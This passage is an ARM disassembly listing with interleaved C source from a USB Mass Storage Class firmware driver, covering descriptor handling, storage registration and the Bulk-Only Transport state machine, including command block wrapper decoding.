  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 80093a2:	2101      	movs	r1, #1
 80093a4:	480f      	ldr	r0, [pc, #60]	; (80093e4 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
 80093a6:	f002 f96b 	bl	800b680 <USBD_GetEpDesc>
 80093aa:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 80093ac:	68fb      	ldr	r3, [r7, #12]
 80093ae:	2b00      	cmp	r3, #0
 80093b0:	d006      	beq.n	80093c0 <USBD_MSC_GetOtherSpeedCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 80093b2:	68fb      	ldr	r3, [r7, #12]
 80093b4:	2200      	movs	r2, #0
 80093b6:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 80093ba:	711a      	strb	r2, [r3, #4]
 80093bc:	2200      	movs	r2, #0
 80093be:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 80093c0:	68bb      	ldr	r3, [r7, #8]
 80093c2:	2b00      	cmp	r3, #0
 80093c4:	d006      	beq.n	80093d4 <USBD_MSC_GetOtherSpeedCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 80093c6:	68bb      	ldr	r3, [r7, #8]
 80093c8:	2200      	movs	r2, #0
 80093ca:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 80093ce:	711a      	strb	r2, [r3, #4]
 80093d0:	2200      	movs	r2, #0
 80093d2:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 80093d4:	687b      	ldr	r3, [r7, #4]
 80093d6:	2220      	movs	r2, #32
 80093d8:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 80093da:	4b02      	ldr	r3, [pc, #8]	; (80093e4 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
}
 80093dc:	4618      	mov	r0, r3
 80093de:	3710      	adds	r7, #16
 80093e0:	46bd      	mov	sp, r7
 80093e2:	bd80      	pop	{r7, pc}
 80093e4:	200000e0 	.word	0x200000e0

080093e8 <USBD_MSC_GetDeviceQualifierDescriptor>:
  *         return Device Qualifier descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetDeviceQualifierDescriptor(uint16_t *length)
{
 80093e8:	b480      	push	{r7}
 80093ea:	b083      	sub	sp, #12
 80093ec:	af00      	add	r7, sp, #0
 80093ee:	6078      	str	r0, [r7, #4]
  *length = (uint16_t)sizeof(USBD_MSC_DeviceQualifierDesc);
 80093f0:	687b      	ldr	r3, [r7, #4]
 80093f2:	220a      	movs	r2, #10
 80093f4:	801a      	strh	r2, [r3, #0]

  return USBD_MSC_DeviceQualifierDesc;
 80093f6:	4b03      	ldr	r3, [pc, #12]	; (8009404 <USBD_MSC_GetDeviceQualifierDescriptor+0x1c>)
}
 80093f8:	4618      	mov	r0, r3
 80093fa:	370c      	adds	r7, #12
 80093fc:	46bd      	mov	sp, r7
 80093fe:	f85d 7b04 	ldr.w	r7, [sp], #4
 8009402:	4770      	bx	lr
 8009404:	20000100 	.word	0x20000100

08009408 <USBD_MSC_RegisterStorage>:
  * @brief  USBD_MSC_RegisterStorage
  * @param  fops: storage callback
  * @retval status
  */
uint8_t USBD_MSC_RegisterStorage(USBD_HandleTypeDef *pdev, USBD_StorageTypeDef *fops)
{
 8009408:	b480      	push	{r7}
 800940a:	b083      	sub	sp, #12
 800940c:	af00      	add	r7, sp, #0
 800940e:	6078      	str	r0, [r7, #4]
 8009410:	6039      	str	r1, [r7, #0]
  if (fops == NULL)
 8009412:	683b      	ldr	r3, [r7, #0]
 8009414:	2b00      	cmp	r3, #0
 8009416:	d101      	bne.n	800941c <USBD_MSC_RegisterStorage+0x14>
  {
    return (uint8_t)USBD_FAIL;
 8009418:	2303      	movs	r3, #3
 800941a:	e009      	b.n	8009430 <USBD_MSC_RegisterStorage+0x28>
  }

  pdev->pUserData[pdev->classId] = fops;
 800941c:	687b      	ldr	r3, [r7, #4]
 800941e:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009422:	687a      	ldr	r2, [r7, #4]
 8009424:	33b0      	adds	r3, #176	; 0xb0
 8009426:	009b      	lsls	r3, r3, #2
 8009428:	4413      	add	r3, r2
 800942a:	683a      	ldr	r2, [r7, #0]
 800942c:	605a      	str	r2, [r3, #4]

  return (uint8_t)USBD_OK;
 800942e:	2300      	movs	r3, #0
}
 8009430:	4618      	mov	r0, r3
 8009432:	370c      	adds	r7, #12
 8009434:	46bd      	mov	sp, r7
 8009436:	f85d 7b04 	ldr.w	r7, [sp], #4
 800943a:	4770      	bx	lr

0800943c <MSC_BOT_Init>:
  *         Initialize the BOT Process
  * @param  pdev: device instance
  * @retval None
  */
void MSC_BOT_Init(USBD_HandleTypeDef *pdev)
{
 800943c:	b580      	push	{r7, lr}
 800943e:	b084      	sub	sp, #16
 8009440:	af00      	add	r7, sp, #0
 8009442:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009444:	687b      	ldr	r3, [r7, #4]
 8009446:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800944a:	687b      	ldr	r3, [r7, #4]
 800944c:	32b0      	adds	r2, #176	; 0xb0
 800944e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009452:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009454:	68fb      	ldr	r3, [r7, #12]
 8009456:	2b00      	cmp	r3, #0
 8009458:	d039      	beq.n	80094ce <MSC_BOT_Init+0x92>
  {
    return;
  }

  hmsc->bot_state = USBD_BOT_IDLE;
 800945a:	68fb      	ldr	r3, [r7, #12]
 800945c:	2200      	movs	r2, #0
 800945e:	721a      	strb	r2, [r3, #8]
  hmsc->bot_status = USBD_BOT_STATUS_NORMAL;
 8009460:	68fb      	ldr	r3, [r7, #12]
 8009462:	2200      	movs	r2, #0
 8009464:	725a      	strb	r2, [r3, #9]

  hmsc->scsi_sense_tail = 0U;
 8009466:	68fb      	ldr	r3, [r7, #12]
 8009468:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800946c:	2200      	movs	r2, #0
 800946e:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61
  hmsc->scsi_sense_head = 0U;
 8009472:	68fb      	ldr	r3, [r7, #12]
 8009474:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009478:	2200      	movs	r2, #0
 800947a:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60
  hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800947e:	68fb      	ldr	r3, [r7, #12]
 8009480:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009484:	2200      	movs	r2, #0
 8009486:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62

  ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Init(0U);
 800948a:	687b      	ldr	r3, [r7, #4]
 800948c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009490:	687a      	ldr	r2, [r7, #4]
 8009492:	33b0      	adds	r3, #176	; 0xb0
 8009494:	009b      	lsls	r3, r3, #2
 8009496:	4413      	add	r3, r2
 8009498:	685b      	ldr	r3, [r3, #4]
 800949a:	681b      	ldr	r3, [r3, #0]
 800949c:	2000      	movs	r0, #0
 800949e:	4798      	blx	r3

  (void)USBD_LL_FlushEP(pdev, MSCOutEpAdd);
 80094a0:	4b0d      	ldr	r3, [pc, #52]	; (80094d8 <MSC_BOT_Init+0x9c>)
 80094a2:	781b      	ldrb	r3, [r3, #0]
 80094a4:	4619      	mov	r1, r3
 80094a6:	6878      	ldr	r0, [r7, #4]
 80094a8:	f003 fc8a 	bl	800cdc0 <USBD_LL_FlushEP>
  (void)USBD_LL_FlushEP(pdev, MSCInEpAdd);
 80094ac:	4b0b      	ldr	r3, [pc, #44]	; (80094dc <MSC_BOT_Init+0xa0>)
 80094ae:	781b      	ldrb	r3, [r3, #0]
 80094b0:	4619      	mov	r1, r3
 80094b2:	6878      	ldr	r0, [r7, #4]
 80094b4:	f003 fc84 	bl	800cdc0 <USBD_LL_FlushEP>

  /* Prepare EP to Receive First BOT Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 80094b8:	4b07      	ldr	r3, [pc, #28]	; (80094d8 <MSC_BOT_Init+0x9c>)
 80094ba:	7819      	ldrb	r1, [r3, #0]
 80094bc:	68fb      	ldr	r3, [r7, #12]
 80094be:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 80094c2:	3210      	adds	r2, #16
 80094c4:	231f      	movs	r3, #31
 80094c6:	6878      	ldr	r0, [r7, #4]
 80094c8:	f003 fdb8 	bl	800d03c <USBD_LL_PrepareReceive>
 80094cc:	e000      	b.n	80094d0 <MSC_BOT_Init+0x94>
    return;
 80094ce:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 80094d0:	3710      	adds	r7, #16
 80094d2:	46bd      	mov	sp, r7
 80094d4:	bd80      	pop	{r7, pc}
 80094d6:	bf00      	nop
 80094d8:	2000010b 	.word	0x2000010b
 80094dc:	2000010a 	.word	0x2000010a

080094e0 <MSC_BOT_Reset>:
  *         Reset the BOT Machine
  * @param  pdev: device instance
  * @retval  None
  */
void MSC_BOT_Reset(USBD_HandleTypeDef *pdev)
{
 80094e0:	b580      	push	{r7, lr}
 80094e2:	b084      	sub	sp, #16
 80094e4:	af00      	add	r7, sp, #0
 80094e6:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80094e8:	687b      	ldr	r3, [r7, #4]
 80094ea:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80094ee:	687b      	ldr	r3, [r7, #4]
 80094f0:	32b0      	adds	r2, #176	; 0xb0
 80094f2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80094f6:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80094f8:	68fb      	ldr	r3, [r7, #12]
 80094fa:	2b00      	cmp	r3, #0
 80094fc:	d01c      	beq.n	8009538 <MSC_BOT_Reset+0x58>
  {
    return;
  }

  hmsc->bot_state  = USBD_BOT_IDLE;
 80094fe:	68fb      	ldr	r3, [r7, #12]
 8009500:	2200      	movs	r2, #0
 8009502:	721a      	strb	r2, [r3, #8]
  hmsc->bot_status = USBD_BOT_STATUS_RECOVERY;
 8009504:	68fb      	ldr	r3, [r7, #12]
 8009506:	2201      	movs	r2, #1
 8009508:	725a      	strb	r2, [r3, #9]

  (void)USBD_LL_ClearStallEP(pdev, MSCInEpAdd);
 800950a:	4b0d      	ldr	r3, [pc, #52]	; (8009540 <MSC_BOT_Reset+0x60>)
 800950c:	781b      	ldrb	r3, [r3, #0]
 800950e:	4619      	mov	r1, r3
 8009510:	6878      	ldr	r0, [r7, #4]
 8009512:	f003 fcc1 	bl	800ce98 <USBD_LL_ClearStallEP>
  (void)USBD_LL_ClearStallEP(pdev, MSCOutEpAdd);
 8009516:	4b0b      	ldr	r3, [pc, #44]	; (8009544 <MSC_BOT_Reset+0x64>)
 8009518:	781b      	ldrb	r3, [r3, #0]
 800951a:	4619      	mov	r1, r3
 800951c:	6878      	ldr	r0, [r7, #4]
 800951e:	f003 fcbb 	bl	800ce98 <USBD_LL_ClearStallEP>

  /* Prepare EP to Receive First BOT Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 8009522:	4b08      	ldr	r3, [pc, #32]	; (8009544 <MSC_BOT_Reset+0x64>)
 8009524:	7819      	ldrb	r1, [r3, #0]
 8009526:	68fb      	ldr	r3, [r7, #12]
 8009528:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 800952c:	3210      	adds	r2, #16
 800952e:	231f      	movs	r3, #31
 8009530:	6878      	ldr	r0, [r7, #4]
 8009532:	f003 fd83 	bl	800d03c <USBD_LL_PrepareReceive>
 8009536:	e000      	b.n	800953a <MSC_BOT_Reset+0x5a>
    return;
 8009538:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 800953a:	3710      	adds	r7, #16
 800953c:	46bd      	mov	sp, r7
 800953e:	bd80      	pop	{r7, pc}
 8009540:	2000010a 	.word	0x2000010a
 8009544:	2000010b 	.word	0x2000010b

08009548 <MSC_BOT_DeInit>:
  *         DeInitialize the BOT Machine
  * @param  pdev: device instance
  * @retval None
  */
void MSC_BOT_DeInit(USBD_HandleTypeDef  *pdev)
{
 8009548:	b480      	push	{r7}
 800954a:	b085      	sub	sp, #20
 800954c:	af00      	add	r7, sp, #0
 800954e:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009550:	687b      	ldr	r3, [r7, #4]
 8009552:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009556:	687b      	ldr	r3, [r7, #4]
 8009558:	32b0      	adds	r2, #176	; 0xb0
 800955a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800955e:	60fb      	str	r3, [r7, #12]

  if (hmsc != NULL)
 8009560:	68fb      	ldr	r3, [r7, #12]
 8009562:	2b00      	cmp	r3, #0
 8009564:	d002      	beq.n	800956c <MSC_BOT_DeInit+0x24>
  {
    hmsc->bot_state = USBD_BOT_IDLE;
 8009566:	68fb      	ldr	r3, [r7, #12]
 8009568:	2200      	movs	r2, #0
 800956a:	721a      	strb	r2, [r3, #8]
  }
}
 800956c:	bf00      	nop
 800956e:	3714      	adds	r7, #20
 8009570:	46bd      	mov	sp, r7
 8009572:	f85d 7b04 	ldr.w	r7, [sp], #4
 8009576:	4770      	bx	lr

08009578 <MSC_BOT_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval None
  */
void MSC_BOT_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8009578:	b580      	push	{r7, lr}
 800957a:	b084      	sub	sp, #16
 800957c:	af00      	add	r7, sp, #0
 800957e:	6078      	str	r0, [r7, #4]
 8009580:	460b      	mov	r3, r1
 8009582:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009584:	687b      	ldr	r3, [r7, #4]
 8009586:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800958a:	687b      	ldr	r3, [r7, #4]
 800958c:	32b0      	adds	r2, #176	; 0xb0
 800958e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009592:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 8009594:	68fb      	ldr	r3, [r7, #12]
 8009596:	2b00      	cmp	r3, #0
 8009598:	d022      	beq.n	80095e0 <MSC_BOT_DataIn+0x68>
  {
    return;
  }

  switch (hmsc->bot_state)
 800959a:	68fb      	ldr	r3, [r7, #12]
 800959c:	7a1b      	ldrb	r3, [r3, #8]
 800959e:	2b02      	cmp	r3, #2
 80095a0:	d005      	beq.n	80095ae <MSC_BOT_DataIn+0x36>
 80095a2:	2b02      	cmp	r3, #2
 80095a4:	db1e      	blt.n	80095e4 <MSC_BOT_DataIn+0x6c>
 80095a6:	3b03      	subs	r3, #3
 80095a8:	2b01      	cmp	r3, #1
 80095aa:	d81b      	bhi.n	80095e4 <MSC_BOT_DataIn+0x6c>
 80095ac:	e013      	b.n	80095d6 <MSC_BOT_DataIn+0x5e>
  {
    case USBD_BOT_DATA_IN:
      if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 80095ae:	68fb      	ldr	r3, [r7, #12]
 80095b0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80095b4:	7f59      	ldrb	r1, [r3, #29]
 80095b6:	68fb      	ldr	r3, [r7, #12]
 80095b8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80095bc:	331f      	adds	r3, #31
 80095be:	461a      	mov	r2, r3
 80095c0:	6878      	ldr	r0, [r7, #4]
 80095c2:	f000 f9e5 	bl	8009990 <SCSI_ProcessCmd>
 80095c6:	4603      	mov	r3, r0
 80095c8:	2b00      	cmp	r3, #0
 80095ca:	da0d      	bge.n	80095e8 <MSC_BOT_DataIn+0x70>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 80095cc:	2101      	movs	r1, #1
 80095ce:	6878      	ldr	r0, [r7, #4]
 80095d0:	f000 f920 	bl	8009814 <MSC_BOT_SendCSW>
      }
      break;
 80095d4:	e008      	b.n	80095e8 <MSC_BOT_DataIn+0x70>

    case USBD_BOT_SEND_DATA:
    case USBD_BOT_LAST_DATA_IN:
      MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 80095d6:	2100      	movs	r1, #0
 80095d8:	6878      	ldr	r0, [r7, #4]
 80095da:	f000 f91b 	bl	8009814 <MSC_BOT_SendCSW>
      break;
 80095de:	e004      	b.n	80095ea <MSC_BOT_DataIn+0x72>
    return;
 80095e0:	bf00      	nop
 80095e2:	e002      	b.n	80095ea <MSC_BOT_DataIn+0x72>

    default:
      break;
 80095e4:	bf00      	nop
 80095e6:	e000      	b.n	80095ea <MSC_BOT_DataIn+0x72>
      break;
 80095e8:	bf00      	nop
  }
}
 80095ea:	3710      	adds	r7, #16
 80095ec:	46bd      	mov	sp, r7
 80095ee:	bd80      	pop	{r7, pc}

080095f0 <MSC_BOT_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval None
  */
void MSC_BOT_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 80095f0:	b580      	push	{r7, lr}
 80095f2:	b084      	sub	sp, #16
 80095f4:	af00      	add	r7, sp, #0
 80095f6:	6078      	str	r0, [r7, #4]
 80095f8:	460b      	mov	r3, r1
 80095fa:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80095fc:	687b      	ldr	r3, [r7, #4]
 80095fe:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009602:	687b      	ldr	r3, [r7, #4]
 8009604:	32b0      	adds	r2, #176	; 0xb0
 8009606:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800960a:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 800960c:	68fb      	ldr	r3, [r7, #12]
 800960e:	2b00      	cmp	r3, #0
 8009610:	d01e      	beq.n	8009650 <MSC_BOT_DataOut+0x60>
  {
    return;
  }

  switch (hmsc->bot_state)
 8009612:	68fb      	ldr	r3, [r7, #12]
 8009614:	7a1b      	ldrb	r3, [r3, #8]
 8009616:	2b00      	cmp	r3, #0
 8009618:	d002      	beq.n	8009620 <MSC_BOT_DataOut+0x30>
 800961a:	2b01      	cmp	r3, #1
 800961c:	d004      	beq.n	8009628 <MSC_BOT_DataOut+0x38>
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
      }
      break;

    default:
      break;
 800961e:	e01a      	b.n	8009656 <MSC_BOT_DataOut+0x66>
      MSC_BOT_CBW_Decode(pdev);
 8009620:	6878      	ldr	r0, [r7, #4]
 8009622:	f000 f81b 	bl	800965c <MSC_BOT_CBW_Decode>
      break;
 8009626:	e016      	b.n	8009656 <MSC_BOT_DataOut+0x66>
      if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 8009628:	68fb      	ldr	r3, [r7, #12]
 800962a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800962e:	7f59      	ldrb	r1, [r3, #29]
 8009630:	68fb      	ldr	r3, [r7, #12]
 8009632:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009636:	331f      	adds	r3, #31
 8009638:	461a      	mov	r2, r3
 800963a:	6878      	ldr	r0, [r7, #4]
 800963c:	f000 f9a8 	bl	8009990 <SCSI_ProcessCmd>
 8009640:	4603      	mov	r3, r0
 8009642:	2b00      	cmp	r3, #0
 8009644:	da06      	bge.n	8009654 <MSC_BOT_DataOut+0x64>
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 8009646:	2101      	movs	r1, #1
 8009648:	6878      	ldr	r0, [r7, #4]
 800964a:	f000 f8e3 	bl	8009814 <MSC_BOT_SendCSW>
      break;
 800964e:	e001      	b.n	8009654 <MSC_BOT_DataOut+0x64>
    return;
 8009650:	bf00      	nop
 8009652:	e000      	b.n	8009656 <MSC_BOT_DataOut+0x66>
      break;
 8009654:	bf00      	nop
  }
}
 8009656:	3710      	adds	r7, #16
 8009658:	46bd      	mov	sp, r7
 800965a:	bd80      	pop	{r7, pc}

0800965c <MSC_BOT_CBW_Decode>:
  *         Decode the CBW command and set the BOT state machine accordingly
  * @param  pdev: device instance
  * @retval None
  */
static void  MSC_BOT_CBW_Decode(USBD_HandleTypeDef *pdev)
{
 800965c:	b580      	push	{r7, lr}
 800965e:	b084      	sub	sp, #16
 8009660:	af00      	add	r7, sp, #0
 8009662:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009664:	687b      	ldr	r3, [r7, #4]
 8009666:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800966a:	687b      	ldr	r3, [r7, #4]
 800966c:	32b0      	adds	r2, #176	; 0xb0
 800966e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009672:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009674:	68fb      	ldr	r3, [r7, #12]
 8009676:	2b00      	cmp	r3, #0
 8009678:	f000 8085 	beq.w	8009786 <MSC_BOT_CBW_Decode+0x12a>
  {
    return;
  }

  hmsc->csw.dTag = hmsc->cbw.dTag;
 800967c:	68fb      	ldr	r3, [r7, #12]
 800967e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009682:	695b      	ldr	r3, [r3, #20]
 8009684:	68fa      	ldr	r2, [r7, #12]
 8009686:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800968a:	6353      	str	r3, [r2, #52]	; 0x34
  hmsc->csw.dDataResidue = hmsc->cbw.dDataLength;
 800968c:	68fb      	ldr	r3, [r7, #12]
 800968e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009692:	699b      	ldr	r3, [r3, #24]
 8009694:	68fa      	ldr	r2, [r7, #12]
 8009696:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800969a:	6393      	str	r3, [r2, #56]	; 0x38

  if ((USBD_LL_GetRxDataSize(pdev, MSCOutEpAdd) != USBD_BOT_CBW_LENGTH) ||
 800969c:	4b3d      	ldr	r3, [pc, #244]	; (8009794 <MSC_BOT_CBW_Decode+0x138>)
 800969e:	781b      	ldrb	r3, [r3, #0]
 80096a0:	4619      	mov	r1, r3
 80096a2:	6878      	ldr	r0, [r7, #4]
 80096a4:	f003 fd02 	bl	800d0ac <USBD_LL_GetRxDataSize>
 80096a8:	4603      	mov	r3, r0
 80096aa:	2b1f      	cmp	r3, #31
 80096ac:	d118      	bne.n	80096e0 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.dSignature != USBD_BOT_CBW_SIGNATURE) ||
 80096ae:	68fb      	ldr	r3, [r7, #12]
 80096b0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096b4:	691b      	ldr	r3, [r3, #16]
  if ((USBD_LL_GetRxDataSize(pdev, MSCOutEpAdd) != USBD_BOT_CBW_LENGTH) ||
 80096b6:	4a38      	ldr	r2, [pc, #224]	; (8009798 <MSC_BOT_CBW_Decode+0x13c>)
 80096b8:	4293      	cmp	r3, r2
 80096ba:	d111      	bne.n	80096e0 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 80096bc:	68fb      	ldr	r3, [r7, #12]
 80096be:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096c2:	7f5b      	ldrb	r3, [r3, #29]
      (hmsc->cbw.dSignature != USBD_BOT_CBW_SIGNATURE) ||
 80096c4:	2b01      	cmp	r3, #1
 80096c6:	d80b      	bhi.n	80096e0 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 80096c8:	68fb      	ldr	r3, [r7, #12]
 80096ca:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096ce:	7f9b      	ldrb	r3, [r3, #30]
 80096d0:	2b00      	cmp	r3, #0
 80096d2:	d005      	beq.n	80096e0 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bCBLength > 16U))
 80096d4:	68fb      	ldr	r3, [r7, #12]
 80096d6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096da:	7f9b      	ldrb	r3, [r3, #30]
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 80096dc:	2b10      	cmp	r3, #16
 80096de:	d90f      	bls.n	8009700 <MSC_BOT_CBW_Decode+0xa4>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 80096e0:	68fb      	ldr	r3, [r7, #12]
 80096e2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096e6:	7f59      	ldrb	r1, [r3, #29]
 80096e8:	2320      	movs	r3, #32
 80096ea:	2205      	movs	r2, #5
 80096ec:	6878      	ldr	r0, [r7, #4]
 80096ee:	f000 fe7b 	bl	800a3e8 <SCSI_SenseCode>

    hmsc->bot_status = USBD_BOT_STATUS_ERROR;
 80096f2:	68fb      	ldr	r3, [r7, #12]
 80096f4:	2202      	movs	r2, #2
 80096f6:	725a      	strb	r2, [r3, #9]
    MSC_BOT_Abort(pdev);
 80096f8:	6878      	ldr	r0, [r7, #4]
 80096fa:	f000 f8cb 	bl	8009894 <MSC_BOT_Abort>
 80096fe:	e045      	b.n	800978c <MSC_BOT_CBW_Decode+0x130>
  }
  else
  {
    if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 8009700:	68fb      	ldr	r3, [r7, #12]
 8009702:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009706:	7f59      	ldrb	r1, [r3, #29]
 8009708:	68fb      	ldr	r3, [r7, #12]
 800970a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800970e:	331f      	adds	r3, #31
 8009710:	461a      	mov	r2, r3
 8009712:	6878      	ldr	r0, [r7, #4]
 8009714:	f000 f93c 	bl	8009990 <SCSI_ProcessCmd>
 8009718:	4603      	mov	r3, r0
 800971a:	2b00      	cmp	r3, #0
 800971c:	da0c      	bge.n	8009738 <MSC_BOT_CBW_Decode+0xdc>
    {
      if (hmsc->bot_state == USBD_BOT_NO_DATA)
 800971e:	68fb      	ldr	r3, [r7, #12]
 8009720:	7a1b      	ldrb	r3, [r3, #8]
 8009722:	2b05      	cmp	r3, #5
 8009724:	d104      	bne.n	8009730 <MSC_BOT_CBW_Decode+0xd4>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 8009726:	2101      	movs	r1, #1
 8009728:	6878      	ldr	r0, [r7, #4]
 800972a:	f000 f873 	bl	8009814 <MSC_BOT_SendCSW>
 800972e:	e02d      	b.n	800978c <MSC_BOT_CBW_Decode+0x130>
      }
      else
      {
        MSC_BOT_Abort(pdev);
 8009730:	6878      	ldr	r0, [r7, #4]
 8009732:	f000 f8af 	bl	8009894 <MSC_BOT_Abort>
 8009736:	e029      	b.n	800978c <MSC_BOT_CBW_Decode+0x130>
      }
    }
    /* Burst xfer handled internally */
    else if ((hmsc->bot_state != USBD_BOT_DATA_IN) &&
 8009738:	68fb      	ldr	r3, [r7, #12]
 800973a:	7a1b      	ldrb	r3, [r3, #8]
 800973c:	2b02      	cmp	r3, #2
